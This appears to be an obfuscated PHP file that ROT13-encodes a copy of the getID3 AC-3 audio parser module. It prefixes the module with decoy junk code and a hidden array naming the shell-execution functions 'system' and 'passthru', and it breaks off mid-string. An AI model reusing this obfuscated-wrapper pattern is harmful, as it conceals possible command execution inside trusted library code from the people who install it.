<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.nhqvb.np3.cuc                                        //
// zbqhyr sbe nanylmvat NP-3 (nxn Qbyol Qvtvgny) nhqvb svyrf   //
// qrcraqrapvrf: ABAR                                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}

pynff trgvq3_np3 rkgraqf trgvq3_unaqyre
{
	/**
	 * @ine neenl
	 */
	cevingr $NP3urnqre = neenl();

	/**
	 * @ine vag
	 */
	cevingr $OFVbssfrg = 0;

	pbafg flapjbeq = 0k0O77;

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		///NU
		$vasb['np3']['enj']['ofv'] = neenl();
		$guvfsvyr_np3              = &$vasb['np3'];
		$guvfsvyr_np3_enj          = &$guvfsvyr_np3['enj'];
		$guvfsvyr_np3_enj_ofv      = &$guvfsvyr_np3_enj['ofv'];


		// uggc://jjj.ngfp.bet/fgnaqneqf/n_52n.cqs

		$vasb['svyrsbezng'] = 'np3';

		// Na NP-3 frevny pbqrq nhqvb ovg fgernz vf znqr hc bs n frdhrapr bs flapuebavmngvba senzrf
		// Rnpu flapuebavmngvba senzr pbagnvaf 6 pbqrq nhqvb oybpxf (NO), rnpu bs juvpu ercerfrag 256
		// arj nhqvb fnzcyrf cre punaary. N flapuebavmngvba vasbezngvba (FV) urnqre ng gur ortvaavat
		// bs rnpu senzr pbagnvaf vasbezngvba arrqrq gb npdhver naq znvagnva flapuebavmngvba. N
		// ovg fgernz vasbezngvba (OFV) urnqre sbyybjf FV, naq pbagnvaf cnenzrgref qrfpevovat gur pbqrq
		// nhqvb freivpr. Gur pbqrq nhqvb oybpxf znl or sbyybjrq ol na nhkvyvnel qngn (Nhk) svryq. Ng gur
		// raq bs rnpu senzr vf na reebe purpx svryq gung vapyhqrf n PEP jbeq sbe reebe qrgrpgvba. Na
		// nqqvgvbany PEP jbeq vf ybpngrq va gur FV urnqre, gur hfr bs juvpu, ol n qrpbqre, vf bcgvbany.
		//
		// flapvasb() | ofv() | NO0 | NO1 | NO2 | NO3 | NO4 | NO5 | Nhk | PEP

		// flapvasb() {
		// 	 flapjbeq    16
		// 	 pep1        16
		// 	 sfpbq        2
		// 	 sezfvmrpbq   6
		// } /* raq bs flapvasb */

		$guvf->sfrrx($vasb['niqngnbssfrg']);
		$grzcNP3urnqre = $guvf->sernq(100); // fubhyq or rabhtu gb pbire nyy qngn, gurer ner fbzr inevnoyr-yratgu svryqf...?
		$guvf->NP3urnqre['flapvasb']  =     trgvq3_yvo::OvtRaqvna2Vag(fhofge($grzcNP3urnqre, 0, 2));
		$guvf->NP3urnqre['ofv']       =     trgvq3_yvo::OvtRaqvna2Ova(fhofge($grzcNP3urnqre, 2));
		$guvfsvyr_np3_enj_ofv['ofvq'] = (trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($grzcNP3urnqre, 5, 1)) & 0kS8) >> 3; // NP3 naq R-NP3 chg gur \"ofvq\" irefvba vqragvsvre va gur fnzr cynpr, ohg hasbegangryl gur 4 olgrf orgjrra gur flapjbeq naq gur irefvba vqragvsvre ner vagrecergrq qvssreragyl, fb teno vg urer fb gur sbyybjvat pbqr fgehpgher pna znxr frafr
		hafrg($grzcNP3urnqre);

		vs ($guvf->NP3urnqre['flapvasb'] !== frys::flapjbeq) {
			vs (!$guvf->vfQrcraqraplSbe('zngebfxn')) {
				hafrg($vasb['svyrsbezng'], $vasb['np3']);
				erghea $guvf->reebe('Rkcrpgvat \"'.qrpurk(frys::flapjbeq).'\" ng bssfrg '.$vasb['niqngnbssfrg'].', sbhaq \"'.qrpurk($guvf->NP3urnqre['flapvasb']).'\"');
			}
		}

		$vasb['nhqvb']['qngnsbezng']   = 'np3';
		$vasb['nhqvb']['ovgengr_zbqr'] = 'poe';
		$vasb['nhqvb']['ybffyrff']     = snyfr;

		vs ($guvfsvyr_np3_enj_ofv['ofvq'] <= 8) {

			$guvfsvyr_np3_enj_ofv['pep1']       = trgvq3_yvo::Ova2Qrp($guvf->ernqUrnqreOFV(16));
			$guvfsvyr_np3_enj_ofv['sfpbq']      =                     $guvf->ernqUrnqreOFV(2);   // 5.4.1.3
			$guvfsvyr_np3_enj_ofv['sezfvmrpbq'] =                     $guvf->ernqUrnqreOFV(6);   // 5.4.1.4
			vs ($guvfsvyr_np3_enj_ofv['sezfvmrpbq'] > 37) { // ovanel: 100101 - frr Gnoyr 5.18 Senzr Fvmr Pbqr Gnoyr (1 jbeq = 16 ovgf)
				$guvf->jneavat('Harkcrpgrq np3.ofv.sezfvmrpbq inyhr: '.$guvfsvyr_np3_enj_ofv['sezfvmrpbq'].', ovgengr abg frg pbeerpgyl');
			}

			$guvfsvyr_np3_enj_ofv['ofvq']  = $guvf->ernqUrnqreOFV(5); // jr nyernql xabj guvf sebz cer-cnefvat gur irefvba vqragvsvre, ohg er-ernq vg gb yrg gur ovgfgernz sybj nf vagraqrq
			$guvfsvyr_np3_enj_ofv['ofzbq'] = $guvf->ernqUrnqreOFV(3);
			$guvfsvyr_np3_enj_ofv['npzbq'] = $guvf->ernqUrnqreOFV(3);

			vs ($guvfsvyr_np3_enj_ofv['npzbq'] & 0k01) {
				// Vs gur yfo bs npzbq vf n 1, pragre punaary vf va hfr naq pzvkyri sbyybjf va gur ovg fgernz.
				$guvfsvyr_np3_enj_ofv['pzvkyri'] = $guvf->ernqUrnqreOFV(2);
				$guvfsvyr_np3['pragre_zvk_yriry'] = frys::pragreZvkYriryYbbxhc($guvfsvyr_np3_enj_ofv['pzvkyri']);
			}

			vs ($guvfsvyr_np3_enj_ofv['npzbq'] & 0k04) {
				// Vs gur zfo bs npzbq vf n 1, fheebhaq punaaryf ner va hfr naq fhezvkyri sbyybjf va gur ovg fgernz.
				$guvfsvyr_np3_enj_ofv['fhezvkyri'] = $guvf->ernqUrnqreOFV(2);
				$guvfsvyr_np3['fheebhaq_zvk_yriry'] = frys::fheebhaqZvkYriryYbbxhc($guvfsvyr_np3_enj_ofv['fhezvkyri']);
			}

			vs ($guvfsvyr_np3_enj_ofv['npzbq'] == 0k02) {
				// Jura bcrengvat va gur gjb punaary zbqr, guvf 2-ovg pbqr vaqvpngrf jurgure be abg gur cebtenz unf orra rapbqrq va Qbyol Fheebhaq.
				$guvfsvyr_np3_enj_ofv['qfhezbq'] = $guvf->ernqUrnqreOFV(2);
				$guvfsvyr_np3['qbyol_fheebhaq_zbqr'] = frys::qbyolFheebhaqZbqrYbbxhc($guvfsvyr_np3_enj_ofv['qfhezbq']);
			}

			$guvfsvyr_np3_enj_ofv['syntf']['ysrba'] = (obby) $guvf->ernqUrnqreOFV(1);

			// Guvf vaqvpngrf ubj sne gur nirentr qvnybthr yriry vf orybj qvtvgny 100 creprag. Inyvq inyhrf ner 1-31.
			// Gur inyhr bs 0 vf erfreirq. Gur inyhrf bs 1 gb 31 ner vagrecergrq nf -1 qO gb -31 qO jvgu erfcrpg gb qvtvgny 100 creprag.
			$guvfsvyr_np3_enj_ofv['qvnyabez'] = $guvf->ernqUrnqreOFV(5);                 // 5.4.2.8 qvnyabez: Qvnybthr Abeznyvmngvba, 5 Ovgf

			$guvfsvyr_np3_enj_ofv['syntf']['pbzce'] = (obby) $guvf->ernqUrnqreOFV(1);       // 5.4.2.9 pbzcer: Pbzcerffvba Tnva Jbeq Rkvfgf, 1 Ovg
			vs ($guvfsvyr_np3_enj_ofv['syntf']['pbzce']) {
				$guvfsvyr_np3_enj_ofv['pbzce'] = $guvf->ernqUrnqreOFV(8);                // 5.4.2.10 pbzce: Pbzcerffvba Tnva Jbeq, 8 Ovgf
				$guvfsvyr_np3['urnil_pbzcerffvba'] = frys::urnilPbzcerffvba($guvfsvyr_np3_enj_ofv['pbzce']);
			}

			$guvfsvyr_np3_enj_ofv['syntf']['ynatpbq'] = (obby) $guvf->ernqUrnqreOFV(1);     // 5.4.2.11 ynatpbqr: Ynathntr Pbqr Rkvfgf, 1 Ovg
			vs ($guvfsvyr_np3_enj_ofv['syntf']['ynatpbq']) {
				$guvfsvyr_np3_enj_ofv['ynatpbq'] = $guvf->ernqUrnqreOFV(8);              // 5.4.2.12 ynatpbq: Ynathntr Pbqr, 8 Ovgf
			}

			$guvfsvyr_np3_enj_ofv['syntf']['nhqcebqvasb'] = (obby) $guvf->ernqUrnqreOFV(1);  // 5.4.2.13 nhqcebqvr: Nhqvb Cebqhpgvba Vasbezngvba Rkvfgf, 1 Ovg
			vs ($guvfsvyr_np3_enj_ofv['syntf']['nhqcebqvasb']) {
				$guvfsvyr_np3_enj_ofv['zvkyriry'] = $guvf->ernqUrnqreOFV(5);             // 5.4.2.14 zvkyriry: Zvkvat Yriry, 5 Ovgf
				$guvfsvyr_np3_enj_ofv['ebbzglc']  = $guvf->ernqUrnqreOFV(2);             // 5.4.2.15 ebbzglc: Ebbz Glcr, 2 Ovgf

				$guvfsvyr_np3['zvkvat_yriry'] = (80 + $guvfsvyr_np3_enj_ofv['zvkyriry']).'qO';
				$guvfsvyr_np3['ebbz_glcr']    = frys::ebbzGlcrYbbxhc($guvfsvyr_np3_enj_ofv['ebbzglc']);
			}


			$guvfsvyr_np3_enj_ofv['qvnyabez2'] = $guvf->ernqUrnqreOFV(5);                // 5.4.2.16 qvnyabez2: Qvnybthr Abeznyvmngvba, pu2, 5 Ovgf
			$guvfsvyr_np3['qvnybthr_abeznyvmngvba2'] = '-'.$guvfsvyr_np3_enj_ofv['qvnyabez2'].'qO';  // Guvf vaqvpngrf ubj sne gur nirentr qvnybthr yriry vf orybj qvtvgny 100 creprag. Inyvq inyhrf ner 1-31. Gur inyhr bs 0 vf erfreirq. Gur inyhrf bs 1 gb 31 ner vagrecergrq nf -1 qO gb -31 qO jvgu erfcrpg gb qvtvgny 100 creprag.

			$guvfsvyr_np3_enj_ofv['syntf']['pbzce2'] = (obby) $guvf->ernqUrnqreOFV(1);       // 5.4.2.17 pbzce2r: Pbzcerffvba Tnva Jbeq Rkvfgf, pu2, 1 Ovg
			vs ($guvfsvyr_np3_enj_ofv['syntf']['pbzce2']) {
				$guvfsvyr_np3_enj_ofv['pbzce2'] = $guvf->ernqUrnqreOFV(8);               // 5.4.2.18 pbzce2: Pbzcerffvba Tnva Jbeq, pu2, 8 Ovgf
				$guvfsvyr_np3['urnil_pbzcerffvba2'] = frys::urnilPbzcerffvba($guvfsvyr_np3_enj_ofv['pbzce2']);
			}

			$guvfsvyr_np3_enj_ofv['syntf']['ynatpbq2'] = (obby) $guvf->ernqUrnqreOFV(1);    // 5.4.2.19 ynatpbq2r: Ynathntr Pbqr Rkvfgf, pu2, 1 Ovg
			vs ($guvfsvyr_np3_enj_ofv['syntf']['ynatpbq2']) {
				$guvfsvyr_np3_enj_ofv['ynatpbq2'] = $guvf->ernqUrnqreOFV(8);             // 5.4.2.20 ynatpbq2: Ynathntr Pbqr, pu2, 8 Ovgf
			}

			$guvfsvyr_np3_enj_ofv['syntf']['nhqcebqvasb2'] = (obby) $guvf->ernqUrnqreOFV(1); // 5.4.2.21 nhqcebqv2r: Nhqvb Cebqhpgvba Vasbezngvba Rkvfgf, pu2, 1 Ovg
			vs ($guvfsvyr_np3_enj_ofv['syntf']['nhqcebqvasb2']) {
				$guvfsvyr_np3_enj_ofv['zvkyriry2'] = $guvf->ernqUrnqreOFV(5);            // 5.4.2.22 zvkyriry2: Zvkvat Yriry, pu2, 5 Ovgf
				$guvfsvyr_np3_enj_ofv['ebbzglc2']  = $guvf->ernqUrnqreOFV(2);            // 5.4.2.23 ebbzglc2: Ebbz Glcr, pu2, 2 Ovgf

				$guvfsvyr_np3['zvkvat_yriry2'] = (80 + $guvfsvyr_np3_enj_ofv['zvkyriry2']).'qO';
				$guvfsvyr_np3['ebbz_glcr2']    = frys::ebbzGlcrYbbxhc($guvfsvyr_np3_enj_ofv['ebbzglc2']);
			}

			$guvfsvyr_np3_enj_ofv['pbclevtug'] = (obby) $guvf->ernqUrnqreOFV(1);         // 5.4.2.24 pbclevtugo: Pbclevtug Ovg, 1 Ovg

			$guvfsvyr_np3_enj_ofv['bevtvany']  = (obby) $guvf->ernqUrnqreOFV(1);         // 5.4.2.25 bevtof: Bevtvany Ovg Fgernz, 1 Ovg

			$guvfsvyr_np3_enj_ofv['syntf']['gvzrpbq1'] = $guvf->ernqUrnqreOFV(2);            // 5.4.2.26 gvzrpbq1r, gvzpbqr2r: Gvzr Pbqr (svefg naq frpbaq) Unyirf Rkvfg, 2 Ovgf
			vs ($guvfsvyr_np3_enj_ofv['syntf']['gvzrpbq1'] & 0k01) {
				$guvfsvyr_np3_enj_ofv['gvzrpbq1'] = $guvf->ernqUrnqreOFV(14);            // 5.4.2.27 gvzrpbq1: Gvzr pbqr svefg unys, 14 ovgf
				$guvfsvyr_np3['gvzrpbqr1'] = 0;
				$guvfsvyr_np3['gvzrpbqr1'] += (($guvfsvyr_np3_enj_ofv['gvzrpbq1'] & 0k3R00) >>  9) * 3600;  // Gur svefg 5 ovgf bs guvf 14-ovg svryq ercerfrag gur gvzr va ubhef, jvgu inyvq inyhrf bs 0�23
				$guvfsvyr_np3['gvzrpbqr1'] += (($guvfsvyr_np3_enj_ofv['gvzrpbq1'] & 0k01S8) >>  3) *   60;  // Gur arkg 6 ovgf ercerfrag gur gvzr va zvahgrf, jvgu inyvq inyhrf bs 0�59
				$guvfsvyr_np3['gvzrpbqr1'] += (($guvfsvyr_np3_enj_ofv['gvzrpbq1'] & 0k0003) >>  0) *    8;  // Gur svany 3 ovgf ercerfragf gur gvzr va 8 frpbaq vaperzragf, jvgu inyvq inyhrf bs 0�7 (ercerfragvat 0, 8, 16, ... 56 frpbaqf)
			}
			vs ($guvfsvyr_np3_enj_ofv['syntf']['gvzrpbq1'] & 0k02) {
				$guvfsvyr_np3_enj_ofv['gvzrpbq2'] = $guvf->ernqUrnqreOFV(14);            // 5.4.2.28 gvzrpbq2: Gvzr pbqr frpbaq unys, 14 ovgf
				$guvfsvyr_np3['gvzrpbqr2'] = 0;
				$guvfsvyr_np3['gvzrpbqr2'] += (($guvfsvyr_np3_enj_ofv['gvzrpbq2'] & 0k3800) >> 11) *   1;              // Gur svefg 3 ovgf bs guvf 14-ovg svryq ercerfrag gur gvzr va frpbaqf, jvgu inyvq inyhrf sebz 0�7 (ercerfragvat 0-7 frpbaqf)
				$guvfsvyr_np3['gvzrpbqr2'] += (($guvfsvyr_np3_enj_ofv['gvzrpbq2'] & 0k07P0) >>  6) *  (1 / 30);        // Gur arkg 5 ovgf ercerfragf gur gvzr va senzrf, jvgu inyvq inyhrf sebz 0�29 (bar senzr = 1/30gu bs n frpbaq)
				$guvfsvyr_np3['gvzrpbqr2'] += (($guvfsvyr_np3_enj_ofv['gvzrpbq2'] & 0k003S) >>  0) * ((1 / 30) / 60);  // Gur svany 6 ovgf ercerfragf senpgvbaf bs 1/64 bs n senzr, jvgu inyvq inyhrf sebz 0�63
			}

			$guvfsvyr_np3_enj_ofv['syntf']['nqqofv'] = (obby) $guvf->ernqUrnqreOFV(1);
			vs ($guvfsvyr_np3_enj_ofv['syntf']['nqqofv']) {
				$guvfsvyr_np3_enj_ofv['nqqofv_yratgu'] = $guvf->ernqUrnqreOFV(6) + 1; // Guvf 6-ovg pbqr, juvpu rkvfgf bayl vs nqqofvqr vf n 1, vaqvpngrf gur yratgu va olgrf bs nqqvgvbany ovg fgernz vasbezngvba. Gur inyvq enatr bs nqqofvy vf 0�63, vaqvpngvat 1�64 nqqvgvbany olgrf, erfcrpgviryl.

				$guvf->NP3urnqre['ofv'] .= trgvq3_yvo::OvtRaqvna2Ova($guvf->sernq($guvfsvyr_np3_enj_ofv['nqqofv_yratgu']));

				$guvfsvyr_np3_enj_ofv['nqqofv_qngn'] = fhofge($guvf->NP3urnqre['ofv'], $guvf->OFVbssfrg, $guvfsvyr_np3_enj_ofv['nqqofv_yratgu'] * 8);
				$guvf->OFVbssfrg += $guvfsvyr_np3_enj_ofv['nqqofv_yratgu'] * 8;
			}


		} ryfrvs ($guvfsvyr_np3_enj_ofv['ofvq'] <= 16) { // R-NP3


			$guvf->reebe('R-NP3 cnefvat vf vapbzcyrgr naq rkcrevzragny va guvf irefvba bs trgVQ3 ('.$guvf->trgvq3->irefvba().'). Abgnoyl gur ovgengr pnyphyngvbaf ner jebat -- inyhr zvtug (be abg) or pbeerpg, ohg vg vf abg pnyphyngrq pbeerpgyl. Rznvy vasb@trgvq3.bet vs lbh xabj ubj gb pnyphyngr RNP3 ovgengr pbeerpgyl.');
			$vasb['nhqvb']['qngnsbezng'] = 'rnp3';

			$guvfsvyr_np3_enj_ofv['fgezglc']          =        $guvf->ernqUrnqreOFV(2);
			$guvfsvyr_np3_enj_ofv['fhofgernzvq']      =        $guvf->ernqUrnqreOFV(3);
			$guvfsvyr_np3_enj_ofv['sezfvm']           =        $guvf->ernqUrnqreOFV(11);
			$guvfsvyr_np3_enj_ofv['sfpbq']            =        $guvf->ernqUrnqreOFV(2);
			vs ($guvfsvyr_np3_enj_ofv['sfpbq'] == 3) {
				$guvfsvyr_np3_enj_ofv['sfpbq2']       =        $guvf->ernqUrnqreOFV(2);
				$guvfsvyr_np3_enj_ofv['ahzoyxfpbq'] = 3; // fvk oybpxf cre flapsenzr
			} ryfr {
				$guvfsvyr_np3_enj_ofv['ahzoyxfpbq']   =        $guvf->ernqUrnqreOFV(2);
			}
			$guvfsvyr_np3['ofv']['oybpxf_cre_flap_senzr'] = frys::oybpxfCreFlapSenzr($guvfsvyr_np3_enj_ofv['ahzoyxfpbq']);
			$guvfsvyr_np3_enj_ofv['npzbq']            =        $guvf->ernqUrnqreOFV(3);
			$guvfsvyr_np3_enj_ofv['syntf']['ysrba']   = (obby) $guvf->ernqUrnqreOFV(1);
			$guvfsvyr_np3_enj_ofv['ofvq']             =        $guvf->ernqUrnqreOFV(5); // jr nyernql xabj guvf sebz cer-cnefvat gur irefvba vqragvsvre, ohg er-ernq vg gb yrg gur ovgfgernz sybj nf vagraqrq
			$guvfsvyr_np3_enj_ofv['qvnyabez']         =        $guvf->ernqUrnqreOFV(5);
			$guvfsvyr_np3_enj_ofv['syntf']['pbzce']       = (obby) $guvf->ernqUrnqreOFV(1);
			vs ($guvfsvyr_np3_enj_ofv['syntf']['pbzce']) {
				$guvfsvyr_np3_enj_ofv['pbzce']        =        $guvf->ernqUrnqreOFV(8);
			}
			vs ($guvfsvyr_np3_enj_ofv['npzbq'] == 0) { // vs 1+1 zbqr (qhny zbab, fb fbzr vgrzf arrq n frpbaq inyhr)
				$guvfsvyr_np3_enj_ofv['qvnyabez2']    =        $guvf->ernqUrnqreOFV(5);
				$guvfsvyr_np3_enj_ofv['syntf']['pbzce2']  = (obby) $guvf->ernqUrnqreOFV(1);
				vs ($guvfsvyr_np3_enj_ofv['syntf']['pbzce2']) {
					$guvfsvyr_np3_enj_ofv['pbzce2']   =        $guvf->ernqUrnqreOFV(8);
				}
			}
			vs ($guvfsvyr_np3_enj_ofv['fgezglc'] == 1) { // vs qrcraqrag fgernz
				$guvfsvyr_np3_enj_ofv['syntf']['punaznc'] = (obby) $guvf->ernqUrnqreOFV(1);
				vs ($guvfsvyr_np3_enj_ofv['syntf']['punaznc']) {
					$guvfsvyr_np3_enj_ofv['punaznc']  =        $guvf->ernqUrnqreOFV(8);
				}
			}
			$guvfsvyr_np3_enj_ofv['syntf']['zvkzqng']     = (obby) $guvf->ernqUrnqreOFV(1);
			vs ($guvfsvyr_np3_enj_ofv['syntf']['zvkzqng']) { // Zvkvat zrgnqngn
				vs ($guvfsvyr_np3_enj_ofv['npzbq'] > 2) { // vs zber guna 2 punaaryf
					$guvfsvyr_np3_enj_ofv['qzvkzbq']  =        $guvf->ernqUrnqreOFV(2);
				}
				vs (($guvfsvyr_np3_enj_ofv['npzbq'] & 0k01) && ($guvfsvyr_np3_enj_ofv['npzbq'] > 2)) { // vs guerr sebag punaaryf rkvfg
					$guvfsvyr_np3_enj_ofv['ygegpzvkyri'] =        $guvf->ernqUrnqreOFV(3);
					$guvfsvyr_np3_enj_ofv['ybebpzvkyri'] =        $guvf->ernqUrnqreOFV(3);
				}
				vs ($guvfsvyr_np3_enj_ofv['npzbq'] & 0k04) { // vs n fheebhaq punaary rkvfgf
					$guvfsvyr_np3_enj_ofv['ygegfhezvkyri'] =        $guvf->ernqUrnqreOFV(3);
					$guvfsvyr_np3_enj_ofv['ybebfhezvkyri'] =        $guvf->ernqUrnqreOFV(3);
				}
				vs ($guvfsvyr_np3_enj_ofv['syntf']['ysrba']) { // vs gur YSR punaary rkvfgf
					$guvfsvyr_np3_enj_ofv['syntf']['ysrzvkyripbq'] = (obby) $guvf->ernqUrnqreOFV(1);
					vs ($guvfsvyr_np3_enj_ofv['syntf']['ysrzvkyripbq']) {
						$guvfsvyr_np3_enj_ofv['ysrzvkyripbq']  =        $guvf->ernqUrnqreOFV(5);
					}
				}
				vs ($guvfsvyr_np3_enj_ofv['fgezglc'] == 0) { // vs vaqrcraqrag fgernz
					$guvfsvyr_np3_enj_ofv['syntf']['ctzfpy'] = (obby) $guvf->ernqUrnqreOFV(1);
					vs ($guvfsvyr_np3_enj_ofv['syntf']['ctzfpy']) {
						$guvfsvyr_np3_enj_ofv['ctzfpy']  =        $guvf->ernqUrnqreOFV(6);
					}
					vs ($guvfsvyr_np3_enj_ofv['npzbq'] == 0) { // vs 1+1 zbqr (qhny zbab, fb fbzr vgrzf arrq n frpbaq inyhr)
						$guvfsvyr_np3_enj_ofv['syntf']['ctzfpy2'] = (obby) $guvf->ernqUrnqreOFV(1);
						vs ($guvfsvyr_np3_enj_ofv['syntf']['ctzfpy2']) {
							$guvfsvyr_np3_enj_ofv['ctzfpy2']  =        $guvf->ernqUrnqreOFV(6);
						}
					}
					$guvfsvyr_np3_enj_ofv['syntf']['rkgctzfpy'] = (obby) $guvf->ernqUrnqreOFV(1);
					vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctzfpy']) {
						$guvfsvyr_np3_enj_ofv['rkgctzfpy']  =        $guvf->ernqUrnqreOFV(6);
					}
					$guvfsvyr_np3_enj_ofv['zvkqrs']  =        $guvf->ernqUrnqreOFV(2);
					vs ($guvfsvyr_np3_enj_ofv['zvkqrs'] == 1) { // zvkvat bcgvba 2
						$guvfsvyr_np3_enj_ofv['cerzvkpzcfry']  = (obby) $guvf->ernqUrnqreOFV(1);
						$guvfsvyr_np3_enj_ofv['qepfep']        = (obby) $guvf->ernqUrnqreOFV(1);
						$guvfsvyr_np3_enj_ofv['cerzvkpzcfpy']  =        $guvf->ernqUrnqreOFV(3);
					} ryfrvs ($guvfsvyr_np3_enj_ofv['zvkqrs'] == 2) { // zvkvat bcgvba 3
						$guvfsvyr_np3_enj_ofv['zvkqngn']       =        $guvf->ernqUrnqreOFV(12);
					} ryfrvs ($guvfsvyr_np3_enj_ofv['zvkqrs'] == 3) { // zvkvat bcgvba 4
						$zvkqrsovgfernq = 0;
						$guvfsvyr_np3_enj_ofv['zvkqrsyra']     =        $guvf->ernqUrnqreOFV(5); $zvkqrsovgfernq += 5;
						$guvfsvyr_np3_enj_ofv['syntf']['zvkqngn2'] = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
						vs ($guvfsvyr_np3_enj_ofv['syntf']['zvkqngn2']) {
							$guvfsvyr_np3_enj_ofv['cerzvkpzcfry']  = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							$guvfsvyr_np3_enj_ofv['qepfep']        = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							$guvfsvyr_np3_enj_ofv['cerzvkpzcfpy']  =        $guvf->ernqUrnqreOFV(3); $zvkqrsovgfernq += 3;
							$guvfsvyr_np3_enj_ofv['syntf']['rkgctzyfpy']   = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctzyfpy']) {
								$guvfsvyr_np3_enj_ofv['rkgctzyfpy']    =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
							}
							$guvfsvyr_np3_enj_ofv['syntf']['rkgctzpfpy']   = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctzpfpy']) {
								$guvfsvyr_np3_enj_ofv['rkgctzpfpy']    =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
							}
							$guvfsvyr_np3_enj_ofv['syntf']['rkgctzefpy']   = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctzefpy']) {
								$guvfsvyr_np3_enj_ofv['rkgctzefpy']    =        $guvf->ernqUrnqreOFV(4);
							}
							$guvfsvyr_np3_enj_ofv['syntf']['rkgctzyffpy']  = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctzyffpy']) {
								$guvfsvyr_np3_enj_ofv['rkgctzyffpy']   =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
							}
							$guvfsvyr_np3_enj_ofv['syntf']['rkgctzeffpy']  = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctzeffpy']) {
								$guvfsvyr_np3_enj_ofv['rkgctzeffpy']   =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
							}
							$guvfsvyr_np3_enj_ofv['syntf']['rkgctzysrfpy'] = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctzysrfpy']) {
								$guvfsvyr_np3_enj_ofv['rkgctzysrfpy']  =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
							}
							$guvfsvyr_np3_enj_ofv['syntf']['qzvkfpy']      = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['qzvkfpy']) {
								$guvfsvyr_np3_enj_ofv['qzvkfpy']       =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
							}
							$guvfsvyr_np3_enj_ofv['syntf']['nqqpu']        = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['nqqpu']) {
								$guvfsvyr_np3_enj_ofv['syntf']['rkgctznhk1fpy']   = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
								vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctznhk1fpy']) {
									$guvfsvyr_np3_enj_ofv['rkgctznhk1fpy']    =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
								}
								$guvfsvyr_np3_enj_ofv['syntf']['rkgctznhk2fpy']   = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
								vs ($guvfsvyr_np3_enj_ofv['syntf']['rkgctznhk2fpy']) {
									$guvfsvyr_np3_enj_ofv['rkgctznhk2fpy']    =        $guvf->ernqUrnqreOFV(4); $zvkqrsovgfernq += 4;
								}
							}
						}
						$guvfsvyr_np3_enj_ofv['syntf']['zvkqngn3'] = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
						vs ($guvfsvyr_np3_enj_ofv['syntf']['zvkqngn3']) {
							$guvfsvyr_np3_enj_ofv['fcpuqng']   =        $guvf->ernqUrnqreOFV(5); $zvkqrsovgfernq += 5;
							$guvfsvyr_np3_enj_ofv['syntf']['nqqfcpuqng'] = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
							vs ($guvfsvyr_np3_enj_ofv['syntf']['nqqfcpuqng']) {
								$guvfsvyr_np3_enj_ofv['fcpuqng1']   =         $guvf->ernqUrnqreOFV(5); $zvkqrsovgfernq += 5;
								$guvfsvyr_np3_enj_ofv['fcpuna1ngg'] =         $guvf->ernqUrnqreOFV(2); $zvkqrsovgfernq += 2;
								$guvfsvyr_np3_enj_ofv['syntf']['nqqfcpuqng1'] = (obby) $guvf->ernqUrnqreOFV(1); $zvkqrsovgfernq += 1;
								vs ($guvfsvyr_np3_enj_ofv['syntf']['nqqfcpuqng1']) {
									$guvfsvyr_np3_enj_ofv['fcpuqng2']   =         $guvf->ernqUrnqreOFV(5); $zvkqrsovgfernq += 5;
